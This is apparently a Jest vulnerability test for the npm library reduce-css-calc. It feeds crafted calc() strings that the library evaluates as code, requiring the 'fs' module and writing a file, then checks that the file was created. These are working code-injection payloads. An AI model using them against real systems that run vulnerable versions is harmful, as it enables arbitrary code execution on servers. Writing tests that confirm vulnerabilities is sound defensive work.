test("Arbitrary code execution in reduce-css-calc", () => {
  expect.assertions(2);
  const fs = require("fs");
  const reduceCSSCalc = require("reduce-css-calc");
  const path = "./reduce-css-calc";
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    console.log(reduceCSSCalc(`calc(                       (Buffer(10000)))`));
    console.log(
      reduceCSSCalc(
        `calc(                       (global['fs'] = require('fs')))`
      )
    );
    console.log(
      reduceCSSCalc(
        `calc(                       (fs['writeFileSync']("reduce-css-calc", "")))`
      )
    );
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
